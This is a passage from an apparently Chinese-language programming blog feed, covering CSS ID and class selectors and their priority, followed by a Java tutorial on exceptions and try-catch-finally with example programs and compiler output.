<li><p>ID选择器和类选择器相似，不同的是，ID选择器不能复用。在一个XHTML文档中，一个ID选择器只能把其CSS样式指定给一个标签。 </p>
</li>
<li><p><font color="#FF7F00"><strong>注：</strong></font>网页中HTML标签的id属性的值，必须是唯一的。id属性一般是给JS使用的，不是让你来加样式的。class属性只能给CSS用，不能给JS用的。</p>
</li>
<li><p>id选择器的名称，必须以**<code>#</code>**开头，后跟HTML标记的id属性的值。</p>
</li>
</ul>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span>&gt;</span><br><span class="line">        &lt;title&gt;php.cn&lt;/title&gt;</span><br><span class="line">    &lt;style type=<span class="string">&quot;text/css&quot;</span>&gt;</span><br><span class="line">    <span class="comment">#NO1&#123;</span></span><br><span class="line">        color:blue;</span><br><span class="line">        background-color:<span class="comment">#88ff99;</span></span><br><span class="line">    &#125;</span><br><span class="line">    .haha&#123;</span><br><span class="line">         color:red;</span><br><span class="line">         background-color:<span class="comment">#88ff66;</span></span><br><span class="line">     &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        &lt;h1 id=<span class="string">&quot;NO1&quot;</span>&gt;习近平心中的互联网&lt;/h1&gt;</span><br><span class="line">        &lt;p class=&quot;haha&quot;&gt;互联网是20世纪最伟大的发明。&lt;/p&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br />

<p><font face="Microsoft YaHei"><strong>（4）选择器的优先级</strong></font></p>
<p>参考：<br><font color="#00B2EE">《<a href="http://www.runoob.com/w3cnote/css-style-priority.html">CSS 样式优先级</a>》</font><br><font color="#00B2EE">《<a href="https://www.cnblogs.com/ombre/p/7418667.html">CSS样式优先级问题</a>》</font> </p>
<blockquote>
<p><strong>选择器的优先级从高到低：</strong><br>ID 选择器， 如 <strong><code>#id&#123;&#125;</code></strong><br>类选择器， 如 <strong><code>.class&#123;&#125;</code></strong><br>属性选择器， 如 <strong><code>a[href=&quot;segmentfault.com&quot;]&#123;&#125;</code></strong><br>伪类选择器， 如 <strong><code>:hover&#123;&#125;</code></strong><br>伪元素选择器， 如 <strong><code>::before&#123;&#125;</code></strong><br>标签选择器， 如 <strong><code>span&#123;&#125;</code></strong><br>通配选择器， 如 <strong><code>*&#123;&#125;</code></strong></p>
</blockquote>
<br />

<h5 id="2-id、class选择器的区别"><a href="#2-id、class选择器的区别" class="headerlink" title="2. id、class选择器的区别"></a><font color="#00B2EE" face="Microsoft YaHei">2. id、class选择器的区别</font></h5><p>id和class属性是网页中两个通用的属性，它们协同工作使整个页面变得丰富多彩。当我们为一个元素定义样式时。可以使用id，也可以使用class。但是我们也应该注意这两者的区别。 </p>
<ol>
<li><p>在css样式表中书写时，id选择符前面应该加前缀符号‘#’，而class选择符前面应该加前缀符号‘.’。 </p>
</li>
<li><p>id属性一般在一个页面中只可以使用一次，而class可以被多次引用。 </p>
</li>
<li><p>id作为元素的标签，用于区分不同结构和内容，而class作为一个样式，它可以应用到任何结构和内容上。 </p>
</li>
<li><p>在布局思路上，一般坚持这样的原则：id是先确定页面的结构和内容，然后再为它定义样式：而class相反，它先定义好一类样式，然后再页面中根据需要把类样式应用到不同的元素和内容上面。 </p>
</li>
<li><p>目前浏览器都能允许在同一个页面内出现多个相同属性值的id，一般情况下也能正常显示，不过当使用javascript通过id来控制元素时就会出现错误。 </p>
</li>
<li><p>在实际应用时，class更多的被应用到文字版块以及页面修饰等方面，而id更多地被用来实现宏伟布局和设计包含块，或包含框的样式。 </p>
</li>
</ol>
<blockquote>
<p><font color="#FF7F00"><strong>注意：</strong></font></p>
</blockquote>
<ol>
<li>ID 有高优先级、唯一性的特点，特指「个体」。<br>相对于 ID，class 的优先级比较适中，特指「特定群体」。<br>Class 的使用需要参考面向对象的抽象概念，把共有的属性抽象出来。</li>
<li>ID是先找到结构/内容，再给它定义样式；<br>Class是先定义好一种样式，再套给多个结构/内容</li>
</ol>
<br />

<h5 id="3-组合选择器"><a href="#3-组合选择器" class="headerlink" title="3. 组合选择器"></a><font color="#00B2EE" face="Microsoft YaHei">3. 组合选择器</font></h5><p><font color="#00B2EE">《<a href="http://www.php.cn/code/570.html">CSS 组合选择器</a>》</font><br><font color="#00B2EE">《<a href="http://www.php.cn/code/665.html">CSS基础教程之组合选择器</a>》</font> </p>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-异常处理(5)</title>
    <url>/post/Java-Exception-Handling7/</url>
    <content><![CDATA[<p>&emsp;<br>&emsp;</p>
<center><font color="#3CB371" face="Comic sans MS" size=5>异常处理</font></center>

<p><a href="https://i.loli.net/2018/12/28/5c25dfcbaa09b.png"><img data-src="https://i.loli.net/2018/12/28/5c25dfcbaa09b.png" alt="程序错误.png"></a><br><a href="https://i.loli.net/2018/12/28/5c25e36859c86.png"><img data-src="https://i.loli.net/2018/12/28/5c25e36859c86.png" alt="程序错误1.png"></a></p>
<p>&emsp;</p>
<h3 id="一、-Java异常基础"><a href="#一、-Java异常基础" class="headerlink" title="一、 Java异常基础"></a><font color="#FF6347" face="Comic sans MS">一、 Java异常基础</font></h3><h4 id="1-1-为什么要引入异常处理机制？"><a href="#1-1-为什么要引入异常处理机制？" class="headerlink" title="1.1  为什么要引入异常处理机制？"></a><font color="#20B2AA" face="Comic sans MS">1.1  为什么要引入异常处理机制？</font></h4><p><font face="Comic sans MS"><font color="red"><strong>程序的错误分为：</strong></font><br><strong>编译错误：</strong>程序员编写程序时语法上出现的错误；<br><strong>运行错误：</strong>程序员编写的程序在语法上没有错误，但是程序在运行时出现错误，本章就主要针对该类错误讲解 -&ensp;- 即异常、异常类和异常处理机制。</font></p>
<p>&emsp;</p>
<h4 id="1-2-以往的错误处理方法"><a href="#1-2-以往的错误处理方法" class="headerlink" title="1.2  以往的错误处理方法"></a><font color="#20B2AA" face="Comic sans MS">1.2  以往的错误处理方法</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**主要缺陷：**
&emsp;程序复杂
&emsp;可靠性差
&emsp;返回信息有限
&emsp;返回代码标准化困难　
以往的程序开发过程中，常常采用<font color="#00B2EE">**返回值**</font>进行处理。例如，在编写一个方法，可以返回一个状态代码，调用者
根据状态代码判断出错与否。若状态代码表示一个错误，则调用该错误的处理程序进行相应的处理，或显示一
个错误页面或错误信息。
</font></td></tr></table>

<p><em>举例</em> <strong><em>以往的错误处理方法：采用返回值进行处理</em></strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">举例：实现将一个文件从硬盘加载近来，导致加载可能失败的运行错误有硬盘错误、文件无法找到等</span><br><span class="line"><span class="keyword">int</span> status=loadTextfile();</span><br><span class="line">If (status!=<span class="number">1</span>)&#123;</span><br><span class="line">  <span class="comment">//something unusual happened, describe it</span></span><br><span class="line"> <span class="keyword">switch</span>(status) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>: </span><br><span class="line">       <span class="comment">//file not found</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">   <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">       <span class="comment">//disk error</span></span><br><span class="line">   <span class="keyword">default</span>:</span><br><span class="line">      <span class="comment">//other error&#125;</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//file loaded OK, continue with program&#125; </span></span><br><span class="line">```      </span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;1.3  Java异常处理方法&lt;/font&gt;</span><br><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#ADD8E6&gt;&lt;font face=&quot;Comic sans MS&quot;&gt;Java异常处理方法：Java为运行错误引入了异常、异常类和异常处理机制。</span><br><span class="line">  **异常：**特殊的运行错误，是在程序运行过程中发生的、会打断程序正常执行的错误</span><br><span class="line">　例如：</span><br><span class="line">　除<span class="number">0</span>溢出</span><br><span class="line">　文件找不到</span><br><span class="line">  数组元素下标越界　</span><br><span class="line"></span><br><span class="line">**异常类：**Java用面向对象的方法处理异常，Java的异常类是处理运行时错误的特殊类，每一种异常类对应一种</span><br><span class="line">特定的运行错误，每一个异常事件由一个异常类的对象来代表。</span><br><span class="line"> *例如：除<span class="number">0</span>溢出（ArithmeticException）</span><br><span class="line">　　　文件找不到（FileNotFoundException）</span><br><span class="line">　　　数组元素下标越界（ArrayIndexOutofBoundsException）*</span><br><span class="line"></span><br><span class="line">**异常处理机制：抛出异常——捕捉异常：**</span><br><span class="line"> 1.  当出现了一些错误，方法都会产生一个&lt;font color=&quot;red&quot;&gt;异常对象&lt;/font&gt;，这个异常对象将交由运行系统来处理。此过程就称为抛出</span><br><span class="line">     &lt;font color=&quot;red&quot;&gt;(throwing)异常&lt;/font&gt;。**包括：系统抛出、用户自定义抛出。**</span><br><span class="line"> <span class="number">2.</span>  接着，运行系统开始寻找合适的处理方法，来处理这个异常。如果系统找到了一个适合的处理该异常方法，</span><br><span class="line">     这一过程就叫&lt;font color=&quot;red&quot;&gt;捕获异常&lt;/font&gt;。</span><br><span class="line">&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;1.4  异常处理的语法支持&lt;/font&gt;</span><br><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#ADD8E6&gt;&lt;font face=&quot;Comic sans MS&quot;&gt;       **－try,catch,throws,throw,finally**</span><br><span class="line">(<span class="number">1</span>) <span class="keyword">try</span>包含可能出现异常的语句块；</span><br><span class="line">(<span class="number">2</span>) 一个或多个<span class="keyword">catch</span>块紧随<span class="keyword">try</span>&#123;&#125;块，每个<span class="keyword">catch</span>块通常处理指定类型的异常；</span><br><span class="line">(<span class="number">3</span>) <span class="keyword">finally</span>引导块紧随<span class="keyword">catch</span>块后，主要用于清理现场（可有可无）。</span><br><span class="line">格式：</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123; ......</span><br><span class="line">&#125;<span class="keyword">catch</span>( ExceptionName1 e )</span><br><span class="line">&#123; ......&#125;</span><br><span class="line"><span class="keyword">catch</span>( ExceptionName2 e )</span><br><span class="line">&#123; ......&#125;</span><br><span class="line"><span class="keyword">finally</span></span><br><span class="line">&#123; ......&#125;</span><br><span class="line">注意：<span class="keyword">finally</span>总是执行，<span class="keyword">catch</span>块不一定执行</span><br><span class="line">&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;1.5  总结&lt;/font&gt;</span><br><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=#EEE0E5&gt;&lt;font face=&quot;Comic sans MS&quot;&gt; (1) Java的异常处理把错误集中起来统一处理。程序员只需要说明何处可能出现异常，如何处理即可；</span><br><span class="line"> (<span class="number">2</span>) 采用面向对象的思想标准化了各种错误的类型；</span><br><span class="line"> (<span class="number">3</span>) Java把程序运行过程中可能遇到的问题分为两类，一类是致命性的，即程序遇到了非常严重的不正常状</span><br><span class="line"> 态，不能简单地恢复执行，这就是&lt;font color=&quot;red&quot;&gt;**错误(对应Error类)**&lt;/font&gt;，如程序运行过程中内存耗尽。另一类是非致命性的，</span><br><span class="line"> 通过某种处理后程序还能继续运行，这就是&lt;font color=&quot;red&quot;&gt;**异常(对应Exception类)**&lt;/font&gt;。</span><br><span class="line">&lt;/font&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">### &lt;font color=&quot;#FF6347&quot; face=&quot;Comic sans MS&quot;&gt;二、 异常类的层次&lt;/font&gt;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;2.1  异常分类&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;font face=&quot;Comic sans MS&quot;&gt;&lt;font color=&quot;red&quot;&gt;**☕异常类：**&lt;/font&gt;异常在Java中都是作为类的实例(对象)的形式出现的。</span><br><span class="line">&amp;emsp;     如 Throwable类, Exception类, Error类……</span><br><span class="line"></span><br><span class="line">&lt;font color=&quot;red&quot;&gt;**☕Java中异常分类：**&lt;/font&gt;</span><br><span class="line"> (1)  &lt;font color=&quot;#00B2EE&quot;&gt;**Error类及其子类：**&lt;/font&gt;描述Java运行时刻系统内部的错误或资源枯竭导致的错误，无法恢复和抛出，发生几率小；</span><br><span class="line"> (2)  &lt;font color=&quot;#00B2EE&quot;&gt;**Exception类及其子类：**&lt;/font&gt;普通程序可以从中恢复，分为&lt;font color=&quot;red&quot;&gt;**运行时异常**&lt;/font&gt;和&lt;font color=&quot;red&quot;&gt;**非运行时异常**&lt;/font&gt;。</span><br><span class="line"></span><br><span class="line">&amp;emsp;异常在Java中也是作为类的实例的形式出现的。Java中的所有的异常类都是从Throwable类派生出来的。&lt;font color=&quot;red&quot;&gt;**Throwable类有两个直接子类：**&lt;/font&gt;&lt;font color=&quot;#00B2EE&quot;&gt;**java.lang.Error**&lt;/font&gt; 和 &lt;font color=&quot;#00B2EE&quot;&gt;**java.lang.Exception**&lt;/font&gt;。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">异常类的层次结构如下图所示。</span><br><span class="line">![<span class="number">58.</span>png](https:<span class="comment">//i.loli.net/2018/12/28/5c2621a200c43.png)</span></span><br><span class="line">**(<span class="number">1</span>) 🔺Error类及其子类主要用来描述一些Java运行时刻系统内部的错误或资源枯竭导致的错误。**普通的程序不能从这类错误中恢复，也无法抛出这种类型的错误，这类错误出现的几率是很小的。</span><br><span class="line">**(<span class="number">2</span>) 🔺另一个异常类的子类是Exception类和它的子类。**在编程中错误的处理主要是对这类错误的处理，如除数为零、数组下标越界等。类Exception是普通程序可以从中恢复的所有规范了的异常的父类。</span><br><span class="line">&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&amp;emsp;</span><br><span class="line">&amp;emsp;</span><br><span class="line">#### &lt;font color=&quot;#20B2AA&quot; face=&quot;Comic sans MS&quot;&gt;2.2  Exception类的子类&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">&lt;font face=&quot;Comic sans MS&quot;&gt;&lt;font color=&quot;red&quot;&gt;**☕Exception类子类有两种：**&lt;/font&gt;</span><br><span class="line">**运行时异常**和**非运行时异常（一般异常）**　&amp;emsp;&amp;emsp;&amp;emsp;　*区别？？？*</span><br><span class="line">&lt;font color=&quot;#00B2EE&quot;&gt;**（1）运行时异常：**&lt;/font&gt;RuntimeException类及其所有子类。      运行时异常是程序员编写程序不正确所导致的异常，理论上，程序员经过检查和测试可以查出这类错误。如**除数为零等，错误的强制类型转换、数组越界访问、空引用**。</span><br><span class="line">&lt;font color=&quot;#00B2EE&quot;&gt;**（2）非运行时异常（一般异常）：**&lt;/font&gt;指可以由编译器在编译时检测到的、可能会发生在方法执行过程中的异常，如找不到指定的文件等，这不是程序本身的错误，如果这些异常情况没有发生，程序本身仍然是完好的。　　</span><br><span class="line">&lt;font color=&quot;red&quot;&gt;**注意：**&lt;/font&gt;**编译器强制要求Java程序必须**&lt;font color=&quot;#00B2EE&quot;&gt;**捕获**&lt;/font&gt;**或**&lt;font color=&quot;#00B2EE&quot;&gt;**声明抛出**&lt;/font&gt;**所有非运行时异常，但对运行时异常不作要求。运行时异常编译可以通过但是运行时出现异常；非运行时异常编译的时候就通不过。**</span><br><span class="line"></span><br><span class="line">*例如：格式不正确的URL、试图为一个不存在的类找到一个代表它的类的对象。除了runtimeexception及其子类以外，其他exception类的子类都是非运行时异常。*</span><br><span class="line">&lt;/font&gt;</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line"><span class="comment">//运行时异常和非运行时异常区别举例  </span></span><br><span class="line">[例<span class="number">5</span>-<span class="number">1</span>] RuntimeExceptionDemo1.java</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RuntimeExceptionDemo1</span></span>&#123;  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">System.out.println(<span class="number">2</span>/<span class="number">0</span>);</span><br><span class="line">&#125;&#125;</span><br><span class="line"></span><br><span class="line">该程序能编译通过，而在运行时，出现如下提示：</span><br><span class="line">&gt; javac RuntimeExceptionDemo1.java</span><br><span class="line">&gt; java RuntimeExceptionDemo1</span><br><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.ArithmeticException: / by zero at </span><br><span class="line">RuntimeExceptionDemo1.main(RuntimeExceptionDemo1.java:<span class="number">4</span>)</span><br><span class="line"><span class="comment">//这里的&quot;ArithmeticException&quot;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">5</span>-<span class="number">2</span>] NonRuntimeExceptionDemo1.java</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NonRuntimeExceptionDemo1</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">       FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        <span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">        in.close();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">会出现如下的错误提示：</span><br><span class="line">javac NonRuntimeExceptionDemo1.java</span><br><span class="line">NonRuntimeExceptionDemo1.java:<span class="number">5</span>: unreported exception java.io.FileNotFoundException; must</span><br><span class="line"> be caught or declared to be thrown</span><br><span class="line">FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">                   ^</span><br><span class="line">NonRuntimeExceptionDemo1.java:<span class="number">7</span>: unreported exception java.io.IOException; mustbe</span><br><span class="line"> caught or declared to be thrown</span><br><span class="line"><span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">                ^</span><br><span class="line">NonRuntimeExceptionDemo1.java:<span class="number">8</span>: unreported exception java.io.IOException; mustbe caught </span><br><span class="line">or declared to be thrown</span><br><span class="line">in.close();</span><br></pre></td></tr></table></figure>

<p>&emsp;<br><font face="Comic sans MS"><font color="red"><strong>☕对运行时异常的说明：</strong></font>由于运行时异常可能会出现在程序的任何地方，而且出现的可能性非常大，因而由程序本身去检测运行异常出现与否，将会使程序的开销过大，所以<br>运行时异常是由Java运行时系统在程序的运行过程中检测到的,它可能在程序中任意部位发生,而且其数目可能很大,因此Java编译器允许程序不对它进行处理。这时，java运行时系统会把生成的运行时异常对象交给默认的异常处理，在标准输出设备上显示异常的内容以及发生异常的位置<br><font color="#00B2EE"><strong>建议对于运行时异常用户不要去捕获，捕获就是承认这个错误，但是一般我们编程的希望是发生错误能改正就尽量改正，除非不是由程序员自己意愿决定的错误。</strong></font><br>&emsp;<br><font color="red"><br><strong>☕对运行时异常和非运行时异常的总结：</strong></font><br>(1) 当出现java.lang.ArithmeticException运行时异常时，不需要用户在程序中对其进行处理，而直接由Java运行时系统进行处理；<br>(2) 对于非运行时异常，Java编译器对程序进行编译的时候，便指出用户需要<font color="#00B2EE">①捕获该类异常</font>或者<font color="#00B2EE">②声明抛出</font>。即对于非运行时异常，用户需要在程序中进行处理，否则编译时无法通过。<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">① 捕获该类异常</span><br><span class="line">[例<span class="number">5</span>-<span class="number">2</span>] NonRuntimeExceptionDemo1.java</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NonRuntimeExceptionDemo1</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">             FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">            <span class="keyword">int</span> s;</span><br><span class="line">            <span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">           in.close();</span><br><span class="line">              &#125;<span class="keyword">catch</span>(Exception e)&#123;…&#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">② 声明抛出</span><br><span class="line">[例<span class="number">5</span>-<span class="number">2</span>] NonRuntimeExceptionDemo1.java</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NonRuntimeExceptionDemo1</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span><span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">      FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">      <span class="keyword">int</span> s;</span><br><span class="line">      <span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">      in.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="2-3-对于运行时异常和非运行时异常的一些说明"><a href="#2-3-对于运行时异常和非运行时异常的一些说明" class="headerlink" title="2.3  对于运行时异常和非运行时异常的一些说明"></a><font color="#20B2AA" face="Comic sans MS">2.3  对于运行时异常和非运行时异常的一些说明</font></h4><p><font face="Comic sans MS"><font color="red"><strong>1. ☕编译器和异常：</strong></font>编译器强制要求程序员捕获或声明抛出非运行时异常<br>   <em>到底为什么要这么做呢？？？</em><br>对于运行时异常，编译器不强制要求，但用户也可以自己去捕获<br>   <em>这个时候会出现什么效果呢？？？</em></p>
<p><font color="red"><strong>2. ☕运行时系统和异常：</strong></font><br>(1) 异常都有抛出的轨迹；<br>(2) 对于所有异常，某个方法产生的异常 ，如果没有被捕获，就会自动抛给方法的调用者（但是对非运行时异常一定要声明抛出），如果调用者还没有捕获，再抛给调用者的调用者，以此类推，直到main方法里发现还没有捕获，那么运行时系统就会来处理这个异常，把异常信息和异常的轨迹信息打印给用户。</p>
<p><font color="red"><strong>3. ☕两点建议：</strong></font><br>(1) 建议对于运行时异常用户不要去捕获，捕获就是承认这个错误，但是一般我们编程者希望是发生错误能改正就尽量改正，除非不是由程序员自己意愿决定的错误；<br>(2) 建议对于非运行时异常，用户应该去捕获，以交代程序员的处理该错误的代码，实在不行，就声明抛出给方法的调用者。</p>
<p><font color="red"><strong>3. ☕异常类常用的方法：</strong></font><br><font color="#00B2EE"><strong>public Exception()</strong></font><br><font color="#00B2EE"><strong>public Exception(String s)</strong></font>&emsp; :该参数一般表示该异常对应的错误的描述<br><font color="#00B2EE"><strong>public String toString()</strong></font>&emsp;:返回描述当前异常对象信息的字符串<br><font color="#00B2EE"><strong>public String getMessage()</strong></font>&emsp;:返回描述当前异常对象信息的详细信息。<br><font color="#00B2EE"><strong>public void printStackTrace()</strong></font>&emsp;:打印当前异常对象使用堆栈的轨迹。<br></font></p>
<p><img data-src="https://i.loli.net/2018/12/29/5c2656f46e0d4.png" alt="5S.png"></p>
<p><img data-src="https://i.loli.net/2018/12/29/5c2656f96a129.png" alt="4DI6.png"></p>
<p>&emsp;<br>&emsp;</p>
<h3 id="三、-try-catch-finally异常处理"><a href="#三、-try-catch-finally异常处理" class="headerlink" title="三、 try-catch-finally异常处理"></a><font color="#FF6347" face="Comic sans MS">三、 try-catch-finally异常处理</font></h3><h4 id="3-1-概括try-catch-finally语句"><a href="#3-1-概括try-catch-finally语句" class="headerlink" title="3.1  概括try-catch-finally语句"></a><font color="#20B2AA" face="Comic sans MS">3.1  概括try-catch-finally语句</font></h4><p><font face="Comic sans MS"><font color="red"><strong>用户处理异常的三种方法:</strong></font><br>       (1)用户可以用try-catch-finally语句进行<font color="#00B2EE"><strong>抛出</strong></font>和<font color="#00B2EE"><strong>捕获处理</strong></font>；<br>       (2)如果不想捕获和处理异常，可以通过throws语句<font color="#00B2EE"><strong>声明要抛出的异常</strong></font>；<br>       (3) 用户可以定义自己的异常类,并用throw语句来抛出。</p>
<p>运行时异常是由Java运行时系统在程序的运行过程中检测到的,它可能在程序中任意部位发生,而且其数目可能很大,因此Java编译器允许程序不对它进行处理。这时，java运行时系统会把生成的运行时异常对象交给默认的异常处理，在标准输出设备上显示异常的内容以及发生异常的位置。即：<font color="red"><strong>运行时异常：会输出到设备显示哪里存在错误，请更正；非运行时异常：编译报错时提示必须添加非运行时异常处理，比如加try{}…catch(类名 对象){}或者使用throws来抛出异常</strong></font>。<br></font></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>-<span class="keyword">catch</span>-<span class="keyword">finally</span>语句对程序运行进行监控，捕获和处理异常通常形式： </span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">调用可能产生异常的方法及其它java语句；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(异常类名<span class="number">1</span> 异常对象名e)&#123;</span><br><span class="line">异常处理语句块；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(异常类名<span class="number">2</span> 异常对象名e)&#123;</span><br><span class="line">异常处理语句块；</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span>&#123;</span><br><span class="line">最终处理；</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[例<span class="number">5</span>-<span class="number">3</span>]访问文本文件text.txt，并将其在屏幕上打印出来。</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TryCatchFinally</span></span></span><br><span class="line"><span class="class"></span>&#123; </span><br><span class="line">      <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">       <span class="keyword">try</span>&#123;</span><br><span class="line">        FileInputStream in=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;text.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        <span class="keyword">while</span>((s=in.read())!=-<span class="number">1</span>) System.out.print(s);</span><br><span class="line">        in.close();</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span>(FileNotFoundException e)&#123;</span><br><span class="line">          System.out.println(“捕获异常：”+e);   <span class="comment">//e会调用toString()方法回显异常信息给程序员</span></span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;捕获异常：&quot;</span>+e);</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">finally</span>&#123;</span><br><span class="line">       System.out.println(<span class="string">&quot;finally块总是执行！&quot;</span>);</span><br><span class="line">       &#125; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">捕获异常：java.io.FileNotFoundException: text.txt (系统找不到指定的文件。)</span><br><span class="line"><span class="keyword">finally</span>块总是执行！</span><br></pre></td></tr></table></figure>

<p>&emsp;<br>&emsp;</p>
<h4 id="3-2-try语句"><a href="#3-2-try语句" class="headerlink" title="3.2  try语句"></a><font color="#20B2AA" face="Comic sans MS">3.2  try语句</font></h4><p><font face="Comic sans MS">☕<font color="red"><strong>try{}</strong></font>：将可能抛出一个或者若干个异常的代码放入try语句块中。<br><font color="red"><strong>注意：</strong></font>应当尽量<strong>减小</strong>try代码块的大小，不要将整个程序代码全部放入try语句块中，而是应当仔细分析代码，在可能出现异常情况的地方用try进行监控。</p>
<p>因为当发生异常时，程序控制由try块转到catch块，Java将跳过try中后面的语句，且永远不会从catch块返回到try块。因此若将整个程序代码都放在try中，若一开始发生异常，则后面的语句将永远不会被执行，从而影响了程序的实现。<br></font></p>
<p>&emsp;</p>
<h4 id="3-3-catch语句"><a href="#3-3-catch语句" class="headerlink" title="3.3  catch语句"></a><font color="#20B2AA" face="Comic sans MS">3.3  catch语句</font></h4><table><tr><td bgcolor=#ADD8E6><font face="Comic sans MS">**📒(1)** <font color="red">**try语句后面必须跟有一个或多个catch语句来处理try中产生的异常事件**</font>。如果try语句中未产生异常，
